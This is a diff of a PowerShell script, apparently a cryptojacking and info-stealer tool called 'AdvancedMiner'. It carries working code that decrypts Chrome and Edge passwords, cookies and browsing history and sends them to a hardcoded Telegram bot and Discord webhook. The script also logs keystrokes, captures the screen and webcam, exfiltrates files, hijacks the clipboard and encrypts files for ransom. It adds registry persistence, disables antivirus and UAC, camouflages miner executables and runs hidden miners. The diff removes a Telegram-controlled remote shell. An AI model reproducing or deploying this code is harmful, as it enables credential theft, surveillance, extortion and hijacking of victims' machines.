@@ -7,41 +7,122 @@
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
-# Load SQLite assembly (ensure System.Data.SQLite.dll is in the specified path)
-Add-Type -Path "C:\SQLite\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
-
 # Define base directory and files
 $baseDir = "$env:APPDATA\AdvancedMiner"
+$miningScriptPath = "$baseDir\mining.ps1"
+$dllDir = "C:\SQLite"
+$dllPath = "$dllDir\System.Data.SQLite.dll"
 $logFile = "$baseDir\mining_log.txt"
 $configFile = "$baseDir\config.json"
-$scriptUrl = "https://raw.githubusercontent.com/yourusername/yourrepo/main/mining.ps1"  # Replace with your repo URL
-if (-not (Test-Path $baseDir)) { 
-    New-Item -Path $baseDir -ItemType Directory -Force | Out-Null 
-    Write-Host "Created directory: $baseDir"
-}
+$scriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
 
-# Telegram API setup
-$telegramBotToken = "7096283583:AAE7iv8FKDJZ5Ok5Bq0NdZ5Qa_a1KoIYfjg"  # Replace with your token
-$telegramChatId = "7486857021"      # Replace with your chat ID
+# URLs for downloading files
+$miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
+$sqliteDllUrl = "https://system.data.sqlite.org/downloads/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip"  # Updated to a valid version
+# Note: If this URL becomes invalid, check https://system.data.sqlite.org for the latest version and update accordingly.
 
-# Discord Webhook URL
-$discordWebhookUrl = "https://discord.com/api/webhooks/1358278272080674994/Wg5AJoXN0TzH8Fo4VpElW4n_zCWE7FH5aYHyBpFc0ygsosMohmR-5gws_VIExd6Vanu9"  # Replace with your webhook URL
+# Add a flag for CPU mining (set based on your setup)
+$cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired
 
 # Logging function
 function Write-Log {
     param ([string]$message)
     $timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
     "$timestamp - $message" | Out-File -FilePath $logFile -Append
-    Write-Host "$timestamp - $message" 
+    Write-Host "$timestamp - $message"
 }
 
-# Config management
-$config = if (Test-Path $configFile) { 
-    Get-Content $configFile | ConvertFrom-Json 
-} else { 
-    @{ "electricity_cost" = 0.1; "pool_fee" = 0.01; "last_algo" = "Ethash"; "telegram_token" = $telegramBotToken; "telegram_chat_id" = $telegramChatId } 
+# Create base directories if they don’t exist
+if (-not (Test-Path $baseDir)) {
+    New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
+    Write-Log "Created directory: $baseDir"
 }
-$config | ConvertTo-Json | Out-File $configFile
+if (-not (Test-Path $dllDir)) {
+    New-Item -Path $dllDir -ItemType Directory -Force | Out-Null
+    Write-Log "Created directory: $dllDir"
+}
+
+# Check and download mining.ps1 if not present
+if (-not (Test-Path $miningScriptPath)) {
+    Write-Log "mining.ps1 not found. Downloading from $miningScriptUrl..."
+    try {
+        Invoke-WebRequest -Uri $miningScriptUrl -OutFile $miningScriptPath -ErrorAction Stop
+        Write-Log "mining.ps1 downloaded successfully to $miningScriptPath."
+    } catch {
+        Write-Log "Failed to download mining.ps1: $_"
+        exit 1
+    }
+} else {
+    Write-Log "mining.ps1 found at $miningScriptPath."
+}
+
+# Check and download System.Data.SQLite.dll if not present
+if (-not (Test-Path $dllPath)) {
+    Write-Log "System.Data.SQLite.dll not found. Downloading and extracting from $sqliteDllUrl..."
+    try {
+        $zipPath = "$env:TEMP\sqlite.zip"
+        $response = Invoke-WebRequest -Uri $sqliteDllUrl -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -PassThru -ErrorAction Stop
+        Write-Log "Download status code: $($response.StatusCode)"
+        Write-Log "Content type: $($response.Headers['Content-Type'])"
+
+        if ($response.StatusCode -ne 200) {
+            Write-Log "Failed to download: HTTP status $($response.StatusCode)"
+            exit 1
+        }
+        if ($response.Headers['Content-Type'] -notlike '*zip*') {
+            Write-Log "Downloaded file is not a ZIP archive (Content-Type: $($response.Headers['Content-Type']))"
+            exit 1
+        }
+
+        $zipBytes = Get-Content -Path $zipPath -Encoding Byte -TotalCount 4
+        if ($zipBytes[0] -ne 0x50 -or $zipBytes[1] -ne 0x4B -or $zipBytes[2] -ne 0x03 -or $zipBytes[3] -ne 0x04) {
+            Write-Log "Downloaded file is not a valid ZIP archive. First 4 bytes: $($zipBytes -join ',')"
+            exit 1
+        }
+
+        Expand-Archive -Path $zipPath -DestinationPath $dllDir -Force -ErrorAction Stop
+        Remove-Item $zipPath -ErrorAction Stop
+        Write-Log "System.Data.SQLite.dll extracted to $dllDir."
+    } catch {
+        Write-Log "Failed to download or extract System.Data.SQLite.dll: $_"
+        exit 1
+    }
+} else {
+    Write-Log "System.Data.SQLite.dll found at $dllPath."
+}
+
+# Load SQLite assembly
+try {
+    Add-Type -Path $dllPath -ErrorAction Stop
+    Write-Log "Successfully loaded System.Data.SQLite.dll."
+} catch {
+    Write-Log "Error: Failed to load System.Data.SQLite.dll: $_"
+    exit 1
+}
+
+# Load configuration from config.json
+if (-not (Test-Path $configFile)) {
+    Write-Log "Config file not found. Creating default config.json."
+    $defaultConfig = @{
+        telegram_token = "7096283583:AAE7iv8FKDJZ5Ok5Bq0NdZ5Qa_a1KoIYfjg"
+        telegram_chat_id = "7486857021"
+        discord_webhook = "https://discord.com/api/webhooks/1358278272080674994/Wg5AJoXN0TzH8Fo4VpElW4n_zCWE7FH5aYHyBpFc0ygsosMohmR-5gws_VIExd6Vanu9"
+        pool_fee = 0.01
+        electricity_cost = 0.1
+        supported_algorithms = @{
+            "Ethash" = "T-Rex"
+            "KawPow" = "NBMiner"
+            "RandomX" = "XMRig"
+            "Autolykos" = "lolMiner"
+        }
+    }
+    $defaultConfig | ConvertTo-Json | Out-File $configFile
+}
+$config = Get-Content $configFile | ConvertFrom-Json
+$telegramBotToken = $config.telegram_token
+$telegramChatId = $config.telegram_chat_id
+$discordWebhookUrl = $config.discord_webhook
+$supportedAlgorithms = $config.supported_algorithms
 
 # Wallet setup (replace with your actual wallets)
 $env:GPU_WALLET = "0x6D8E80004900a938b518e1aA01fDdB384a089F1E"  # ETH Wallet
@@ -52,9 +133,12 @@ $env:TON_WALLET = "UQDg4WHFrh5CagHuodkhfzrlFtW_nCyCpq_hD763gb6yhOC0"  # TON Wall
 $script:lastHashrate = 0
 $script:totalEarnings = 0
 $script:overheatCount = 0
-$script:lastUpdateId = 0  # Track last processed Telegram update
+$script:lastUpdateId = 0
+$script:currentAlgorithm = "Ethash"
+$script:lastSwitchTime = Get-Date
 
-# Function to Send Message via Telegram
+# **Telegram/Discord Functions**
+
 function Send-TelegramMessage {
     param ([string]$message)
     $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
@@ -68,7 +152,6 @@ function Send-TelegramMessage {
     }
 }
 
-# Function to Send File via Telegram
 function Send-TelegramFile {
     param ([string]$filePath)
     $url = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
@@ -85,7 +168,6 @@ function Send-TelegramFile {
     }
 }
 
-# Function to Send Message via Discord Webhook
 function Send-DiscordWebhook {
     param ([string]$message)
     $body = @{ content = $message } | ConvertTo-Json
@@ -96,32 +178,36 @@ function Send-DiscordWebhook {
     }
 }
 
-### Account Grabbing Functions
+# **Account Grabbing Functions**
 
-# Get Chrome Encryption Key
 function Get-ChromeEncryptionKey {
     $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
     if (-not (Test-Path $localStatePath)) {
-        Write-Log "Chrome Local State file not found."
+        Write-Log "Chrome Local State file not found at $localStatePath."
         return $null
     }
-    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-    $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI" prefix
-    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
-    return $decryptedKey
+    try {
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI" prefix
+        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
+        Write-Log "Successfully retrieved Chrome encryption key."
+        return $decryptedKey
+    } catch {
+        Write-Log "Failed to retrieve Chrome encryption key: $_"
+        return $null
+    }
 }
 
-# Decrypt Chrome Password
 function Decrypt-ChromePassword {
     param (
         [byte[]]$encryptedData,
         [byte[]]$key
     )
     if ([System.Text.Encoding]::ASCII.GetString($encryptedData[0..2]) -eq "v10") {
-        $nonce = $encryptedData[3..14]  # 12-byte nonce
-        $cipherText = $encryptedData[15..($encryptedData.Length - 17)]  # Ciphertext
-        $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]  # 16-byte tag
+        $nonce = $encryptedData[3..14]
+        $cipherText = $encryptedData[15..($encryptedData.Length - 17)]
+        $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]
         $aesGcm = New-Object System.Security.Cryptography.AesGcm($key)
         $plainText = New-Object byte[] $cipherText.Length
         $aesGcm.Decrypt($nonce, $cipherText, $tag, $plainText)
@@ -131,25 +217,40 @@ function Decrypt-ChromePassword {
     }
 }
 
-# Grab Chrome Credentials (Fixed)
 function Get-ChromeCredentials {
     $chromeDbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     $tempDb = "$env:TEMP\ChromeLoginData.db"
     if (-not (Test-Path $chromeDbPath)) {
-        Write-Log "Chrome Login Data not found."
+        Write-Log "Chrome Login Data not found at $chromeDbPath."
         return
     }
+    Write-Log "Copying Chrome Login Data to $tempDb."
     Copy-Item $chromeDbPath $tempDb -Force
-    $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-    $connection.ConnectionString = "Data Source=$tempDb"
-    $connection.Open()
+    try {
+        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
+        $connection.ConnectionString = "Data Source=$tempDb"
+        $connection.Open()
+        Write-Log "Opened Chrome database connection."
+    } catch {
+        Write-Log "Failed to open Chrome database: $_"
+        Remove-Item $tempDb
+        return
+    }
     $query = "SELECT origin_url, username_value, password_value FROM logins"
     $command = $connection.CreateCommand()
     $command.CommandText = $query
-    $reader = $command.ExecuteReader()
+    try {
+        $reader = $command.ExecuteReader()
+        Write-Log "Query executed successfully."
+    } catch {
+        Write-Log "Query failed: $_"
+        $connection.Close()
+        Remove-Item $tempDb
+        return
+    }
     $encryptionKey = Get-ChromeEncryptionKey
     if (-not $encryptionKey) {
-        Write-Log "Failed to retrieve Chrome encryption key."
+        Write-Log "Failed to get encryption key."
         $connection.Close()
         Remove-Item $tempDb
         return
@@ -164,9 +265,9 @@ function Get-ChromeCredentials {
                 $message = "Chrome - URL: $url, User: $username, Pass: $password"
                 Send-TelegramMessage -message $message
                 Send-DiscordWebhook -message $message
-                Write-Log "Extracted Chrome credential for $url"
+                Write-Log "Extracted credential for $url"
             } catch {
-                Write-Log ("Failed to decrypt password for {0}: {1}" -f $url, $_)
+                Write-Log "Decryption failed for $($url): $_"
             }
         }
     }
@@ -174,23 +275,38 @@ function Get-ChromeCredentials {
     Remove-Item $tempDb
 }
 
-# Grab Edge Credentials (Fixed)
 function Get-EdgeCredentials {
     $edgeDbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
     $tempDb = "$env:TEMP\EdgeLoginData.db"
     if (-not (Test-Path $edgeDbPath)) {
-        Write-Log "Edge Login Data not found."
+        Write-Log "Edge Login Data not found at $edgeDbPath."
         return
     }
+    Write-Log "Copying Edge Login Data to $tempDb."
     Copy-Item $edgeDbPath $tempDb -Force
-    $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-    $connection.ConnectionString = "Data Source=$tempDb"
-    $connection.Open()
+    try {
+        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
+        $connection.ConnectionString = "Data Source=$tempDb"
+        $connection.Open()
+        Write-Log "Opened Edge database connection."
+    } catch {
+        Write-Log "Failed to open Edge database: $_"
+        Remove-Item $tempDb
+        return
+    }
     $query = "SELECT origin_url, username_value, password_value FROM logins"
     $command = $connection.CreateCommand()
     $command.CommandText = $query
-    $reader = $command.ExecuteReader()
-    $encryptionKey = Get-ChromeEncryptionKey  # Edge uses the same key storage
+    try {
+        $reader = $command.ExecuteReader()
+        Write-Log "Query executed successfully."
+    } catch {
+        Write-Log "Query failed: $_"
+        $connection.Close()
+        Remove-Item $tempDb
+        return
+    }
+    $encryptionKey = Get-ChromeEncryptionKey
     if (-not $encryptionKey) {
         Write-Log "Failed to retrieve Edge encryption key."
         $connection.Close()
@@ -209,7 +325,7 @@ function Get-EdgeCredentials {
                 Send-DiscordWebhook -message $message
                 Write-Log "Extracted Edge credential for $url"
             } catch {
-                Write-Log ("Failed to decrypt password for {0}: {1}" -f $url, $_)
+                Write-Log "Decryption failed for $($url): $_"
             }
         }
     }
@@ -217,9 +333,107 @@ function Get-EdgeCredentials {
     Remove-Item $tempDb
 }
 
-### Additional Unethical Features
+# **Additional Unethical Features**
 
-# Keylogging
+function Get-ChromeHistory {
+    $historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    $tempHistory = "$env:TEMP\ChromeHistory.db"
+    if (-not (Test-Path $historyPath)) {
+        Write-Log "Chrome History not found at $historyPath."
+        return
+    }
+    Write-Log "Copying Chrome History to $tempHistory."
+    Copy-Item $historyPath $tempHistory -Force
+    try {
+        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
+        $connection.ConnectionString = "Data Source=$tempHistory"
+        $connection.Open()
+        Write-Log "Opened Chrome History database."
+        $query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
+        $command = $connection.CreateCommand()
+        $command.CommandText = $query
+        $reader = $command.ExecuteReader()
+        $history = while ($reader.Read()) { "$($reader['url']) - $($reader['title'])" }
+        Send-TelegramMessage -message ($history -join "`n")
+        $connection.Close()
+        Remove-Item $tempHistory
+        Write-Log "Sent Chrome history via Telegram."
+    } catch {
+        Write-Log "Failed to extract Chrome history: $_"
+    }
+}
+
+function Get-ChromeCookies {
+    $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
+    $tempCookies = "$env:TEMP\ChromeCookies.db"
+    if (-not (Test-Path $cookiesPath)) {
+        Write-Log "Chrome Cookies not found at $cookiesPath."
+        return
+    }
+    Write-Log "Copying Chrome Cookies to $tempCookies."
+    Copy-Item $cookiesPath $tempCookies -Force
+    try {
+        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
+        $connection.ConnectionString = "Data Source=$tempCookies"
+        $connection.Open()
+        Write-Log "Opened Chrome Cookies database."
+        $query = "SELECT host_key, name, encrypted_value FROM cookies"
+        $command = $connection.CreateCommand()
+        $command.CommandText = $query
+        $reader = $command.ExecuteReader()
+        $encryptionKey = Get-ChromeEncryptionKey
+        while ($reader.Read()) {
+            $host = $reader["host_key"]
+            $name = $reader["name"]
+            $encryptedValue = [byte[]]$reader["encrypted_value"]
+            $value = Decrypt-ChromePassword -encryptedData $encryptedValue -key $encryptionKey
+            $cookie = "Host: $host, Name: $name, Value: $value"
+            Send-TelegramMessage -message $cookie
+        }
+        $connection.Close()
+        Remove-Item $tempCookies
+        Write-Log "Sent Chrome cookies via Telegram."
+    } catch {
+        Write-Log "Failed to extract Chrome cookies: $_"
+    }
+}
+
+function Simulate-Ransomware {
+    $testDir = "C:\TestFolder"
+    if (-not (Test-Path $testDir)) {
+        Write-Log "Test directory $testDir not found."
+        return
+    }
+    $key = New-Object Byte[] 32
+    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)
+    Get-ChildItem $testDir -File | ForEach-Object {
+        $content = Get-Content $_.FullName -Raw
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $encryptor = $aes.CreateEncryptor($key, $aes.IV)
+        $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length)
+        Set-Content $_.FullName $encrypted -Encoding Byte
+        Rename-Item $_.FullName "$($_.Name).encrypted"
+    }
+    $ransomNote = "Files encrypted. Decryption key: $([Convert]::ToBase64String($key))"
+    $ransomNote | Out-File "$testDir\README.txt"
+    Send-TelegramMessage -message $ransomNote
+    Write-Log "Ransomware simulation executed."
+}
+
+function Capture-NetworkTraffic {
+    $captureFile = "$env:TEMP\network_capture.etl"
+    try {
+        netsh trace start capture=yes tracefile=$captureFile maxsize=10
+        Start-Sleep -Seconds 60
+        netsh trace stop
+        Send-TelegramFile -filePath $captureFile
+        Remove-Item $captureFile
+        Write-Log "Network traffic captured and sent."
+    } catch {
+        Write-Log "Failed to capture network traffic: $_"
+    }
+}
+
 function Start-Keylogging {
     Add-Type -AssemblyName System.Windows.Forms
     $logFile = "$env:TEMP\keystrokes.txt"
@@ -240,10 +454,9 @@ function Start-Keylogging {
     }
 }
 
-# Screen Recording (requires FFmpeg installed)
 function Start-ScreenRecording {
     $outputFile = "$env:TEMP\screen_record.mp4"
-    $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"  # Adjust path as needed
+    $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
     if (Test-Path $ffmpegPath) {
         & $ffmpegPath -f gdigrab -framerate 30 -i desktop -t 10 $outputFile -y
         Send-TelegramFile -filePath $outputFile
@@ -254,7 +467,6 @@ function Start-ScreenRecording {
     }
 }
 
-# Webcam Snapshot
 function Capture-Webcam {
     $outputImage = "$env:TEMP\webcam.jpg"
     try {
@@ -269,7 +481,6 @@ function Capture-Webcam {
     }
 }
 
-# File Exfiltration
 function Exfiltrate-Files {
     $targetFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.docx, *.txt, *.pdf, *wallet* -ErrorAction SilentlyContinue
     foreach ($file in $targetFiles) {
@@ -279,62 +490,6 @@ function Exfiltrate-Files {
     }
 }
 
-# Remote Shell via Telegram
-function Start-RemoteShell {
-    Send-TelegramMessage -message "Remote shell activated. Send commands via Telegram."
-    Write-Log "Remote shell started."
-    while ($true) {
-        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/getUpdates?offset=$script:lastUpdateId" -Method Get
-        if ($updates.ok -and $updates.result) {
-            foreach ($update in $updates.result) {
-                $script:lastUpdateId = $update.update_id + 1
-                if ($update.message.chat.id -eq [int64]$telegramChatId) {
-                    $command = $update.message.text
-                    try {
-                        $output = Invoke-Expression $command 2>&1
-                        Send-TelegramMessage -message "Command output: $output"
-                        Send-DiscordWebhook -message "Executed: $command | Output: $output"
-                        Write-Log "Executed command: $command"
-                    } catch {
-                        Send-TelegramMessage -message "Command failed: $_"
-                        Write-Log "Command failed: $_"
-                    }
-                }
-            }
-        }
-        Start-Sleep -Seconds 2
-    }
-}
-
-# Ransomware Simulation (reversible encryption)
-function Start-Ransomware {
-    $key = [Convert]::ToBase64String((1..32 | ForEach-Object { Get-Random -Minimum 0 -Maximum 255 }))
-    $targetDir = "$env:USERPROFILE\Documents"
-    $files = Get-ChildItem -Path $targetDir -Recurse -File
-    foreach ($file in $files) {
-        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
-        if ($content) {
-            $encrypted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
-            $encrypted | Set-Content "$($file.FullName).encrypted"
-            Remove-Item $file.FullName
-        }
-    }
-    $ransomNote = "Your files are encrypted. For testing, decrypt with key: $key"
-    $ransomNote | Out-File "$targetDir\README.txt"
-    Send-TelegramMessage -message $ransomNote
-    Send-DiscordWebhook -message $ransomNote
-    Write-Log "Ransomware simulation executed with key: $key"
-}
-
-# Network Sniffing (basic)
-function Start-NetworkSniffing {
-    $packets = netstat -an | Out-String
-    Send-TelegramMessage -message "Network activity: $packets"
-    Send-DiscordWebhook -message "Network sniffing captured."
-    Write-Log "Network sniffing executed."
-}
-
-# Clipboard Hijacking
 function Start-ClipboardHijacking {
     while ($true) {
         $clip = Get-Clipboard
@@ -348,18 +503,147 @@ function Start-ClipboardHijacking {
     }
 }
 
-# Enhanced Persistence via Registry
+# **Mining Functions**
+
+function Get-MostProfitableCoin {
+    try {
+        $profitData = Invoke-RestMethod -Uri "https://whattomine.com/coins.json" -TimeoutSec 10
+        $coins = $profitData.coins | Where-Object { $_.algorithm -in $supportedAlgorithms.Keys }
+        if (-not $coins) {
+            Write-Log "No profitable coins found for supported algorithms."
+            return $null
+        }
+        $bestCoin = $coins | ForEach-Object {
+            $_ | Add-Member -NotePropertyName "net_profit" -NotePropertyValue ($_.profitability * (1 - $config.pool_fee)) -PassThru
+        } | Sort-Object -Property net_profit -Descending | Select-Object -First 1
+        Write-Log "Most profitable coin: $($bestCoin.tag) with algorithm $($bestCoin.algorithm)"
+        return $bestCoin
+    } catch {
+        Write-Log "Failed to fetch profitability data: $_"
+        return $null
+    }
+}
+
+function Get-BestPool {
+    param ([string]$algorithm)
+    $pools = @{
+        "Ethash" = @("stratum+tcp://etc.2miners.com:1010", "stratum+tcp://eth.nanopool.org:9999")
+        "KawPow" = @("stratum+tcp://rvn.2miners.com:6060", "stratum+tcp://rvn.nanopool.org:12222")
+        "RandomX" = @("stratum+tcp://xmr.pool.minergate.com:443", "stratum+tcp://pool.hashvault.pro:5555")
+        "Autolykos" = @("stratum+tcp://ergo.2miners.com:8888", "stratum+tcp://ergo.nanopool.org:11111")
+    }
+    if ($pools.ContainsKey($algorithm)) {
+        return $pools[$algorithm] | Get-Random
+    }
+    return "stratum+tcp://pool.hashvault.pro:5555"
+}
+
+function Set-NvidiaOverclock {
+    param ([int]$powerLimit = 70, [int]$coreOffset = 100, [int]$memOffset = 500)
+    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
+    if (Test-Path $nvidiaSmi) {
+        & $nvidiaSmi -pl $powerLimit
+        & $nvidiaSmi -lgc $coreOffset
+        & $nvidiaSmi -lmc $memOffset
+        Write-Log "Applied NVIDIA overclock: Power $powerLimit W, Core +$coreOffset MHz, Mem +$memOffset MHz"
+    }
+}
+
+function Set-AmdOverclock {
+    param ([string]$profile = "Profile1")
+    $overdriveToolPath = "$baseDir\OverdriveNTool.exe"
+    if (Test-Path $overdriveToolPath) {
+        & $overdriveToolPath -p1$profile
+        Write-Log "Applied AMD overclock profile: $profile"
+    }
+}
+
+function Install-Miner {
+    param ([string]$miner, [string]$url, [string]$path)
+    try {
+        if (-not (Test-Path $path)) { New-Item -Path $path -ItemType Directory -Force | Out-Null }
+        $exePath = "$path\$miner.exe"
+        if (-not (Test-Path $exePath)) {
+            Download-Miner -miner $miner -url $url -path $path
+        }
+        Write-Log "Miner ready at $exePath."
+        return "$miner.exe"
+    } catch {
+        Write-Log "Install-Miner ($miner) failed: $_"
+        return $null
+    }
+}
+
+function Start-Miner {
+    param (
+        [string]$algorithm,
+        [string]$pool,
+        [int]$gpuIndex = -1
+    )
+    $miner = $supportedAlgorithms[$algorithm]
+    $exePath = "$baseDir\$miner\$miner.exe"
+    if (-not (Test-Path $exePath)) { return $null }
+    $args = switch ($algorithm) {
+        "Ethash" { "-a ethash -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x --api-bind-http 127.0.0.1:4067" }
+        "KawPow" { "-a kawpow -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x" }
+        "RandomX" { "--donate-level=1 -o $pool -u $env:XMR_WALLET -p $env:COMPUTERNAME --http-enabled --http-port=4068" }
+        "Autolykos" { "-a autolykos2 -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x" }
+    }
+    if ($gpuIndex -ge 0) { $args += " --devices $gpuIndex" }
+    try {
+        $process = Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden -PassThru
+        Write-Log "$miner started (PID: $($process.Id)) for $algorithm."
+        return $process
+    } catch {
+        Write-Log "Failed to start $($miner): $_"
+    }
+}
+
+function Stop-Miner {
+    Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue | Stop-Process -Force
+    Write-Log "All miners stopped."
+}
+
+function Monitor-Miner {
+    while ($true) {
+        if (-not (Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue)) {
+            Write-Log "Miners not running. Restarting..."
+            $bestCoin = Get-MostProfitableCoin
+            if ($bestCoin) {
+                $pool = Get-BestPool -algorithm $bestCoin.algorithm
+                Start-Miner -algorithm $bestCoin.algorithm -pool $pool
+            }
+        }
+        Start-Sleep -Seconds 300
+    }
+}
+
+function Set-MinerIntensity {
+    param ([int]$intensity)
+    Write-Log "Intensity adjustment not implemented for all miners."
+}
+
+function Switch-Coin {
+    param ([string]$coin)
+    $algorithm = $supportedAlgorithms.Keys | Where-Object { (Get-MostProfitableCoin).tag -eq $coin }
+    if ($algorithm) {
+        Stop-Miner
+        $pool = Get-BestPool -algorithm $algorithm
+        Start-Miner -algorithm $algorithm -pool $pool
+        $script:currentAlgorithm = $algorithm
+    }
+}
+
+# **Utility Functions**
+
 function Ensure-Persistence {
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $scriptPath = "$baseDir\mining.ps1"
-    if (-not (Test-Path "Registry::$regPath")) {
-        New-Item -Path "Registry::$regPath" -Force | Out-Null
-    }
+    if (-not (Test-Path "Registry::$regPath")) { New-Item -Path "Registry::$regPath" -Force | Out-Null }
     Set-ItemProperty -Path "Registry::$regPath" -Name "AdvancedMiner" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
     Write-Log "Persistence added via registry."
 }
 
-# Disable All Antivirus (beyond Windows Defender)
 function Disable-AllAntivirus {
     $avServices = @("McAfee", "Norton", "Symantec", "Kaspersky", "Avast", "AVG", "Bitdefender", "TrendMicro", "Sophos")
     foreach ($service in $avServices) {
@@ -375,481 +659,210 @@ function Disable-AllAntivirus {
     Write-Log "Attempted to disable all antivirus software."
 }
 
-# Prevent sleep
 function Prevent-Sleep {
-    Write-Log "Starting sleep prevention..."
-    try {
-        $shell = New-Object -ComObject "WScript.Shell"
-        Start-Job -Name "SleepPreventer" -ArgumentList $shell -ScriptBlock {
-            param ($shell)
-            while ($true) {
-                $shell.SendKeys("{F15}")
-                Start-Sleep -Seconds 60
-            }
+    $shell = New-Object -ComObject "WScript.Shell"
+    Start-Job -Name "SleepPreventer" -ScriptBlock {
+        param ($shell)
+        while ($true) {
+            $shell.SendKeys("{F15}")
+            Start-Sleep -Seconds 60
         }
-        Write-Log "Sleep prevention job started."
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Prevent-Sleep: $_"
-    }
+    } -ArgumentList $shell
+    Write-Log "Sleep prevention job started."
 }
 
-# Security bypass and permanent disabling
 function Bypass-WindowsSecurity {
-    Write-Log "Bypassing and disabling Windows security..."
-    try {
-        Disable-AllAntivirus
-        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
-        Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
-        $paths = @("$baseDir\T-Rex", "$baseDir\TeamRedMiner", "$baseDir\XMRig", $baseDir)
-        foreach ($path in $paths) {
-            if (-not (Get-MpPreference).ExclusionPath -contains $path) {
-                Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
-                Write-Log "Exclusion added for path: $path"
-            }
+    Disable-AllAntivirus
+    Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
+    $paths = @("$baseDir\T-Rex", "$baseDir\TeamRedMiner", "$baseDir\XMRig", "$baseDir\lolMiner", $baseDir)
+    foreach ($path in $paths) {
+        if (-not (Get-MpPreference).ExclusionPath -contains $path) {
+            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+            Write-Log "Exclusion added for path: $path"
         }
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
-        Write-Log "Windows security fully bypassed and disabled."
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Bypass-WindowsSecurity: $_"
     }
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
+    Write-Log "Windows security bypassed."
 }
 
-# Download miner with camouflage
 function Download-Miner {
     param ([string]$miner, [string]$url, [string]$path)
-    try {
-        $zipPath = "$env:TEMP\$miner.zip"
-        Write-Log "Downloading $miner from $url..."
-        Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
-        Expand-Archive -Path $zipPath -DestinationPath $path -Force -ErrorAction Stop
-        Remove-Item $zipPath -ErrorAction Stop
-        $exeName = "$miner.exe"
-        $exePath = Get-ChildItem -Path $path -Filter $exeName -Recurse | Select-Object -First 1
-        if ($exePath) {
-            $camouflagedExe = "$path\system_service.exe"
-            Move-Item -Path $exePath.FullName -Destination $camouflagedExe -Force
-            Get-ChildItem -Path $path -Directory | Remove-Item -Recurse -Force
-            Write-Log "$miner camouflaged as $camouflagedExe"
-        } else {
-            throw "Executable $exeName not found."
-        }
-    } catch {
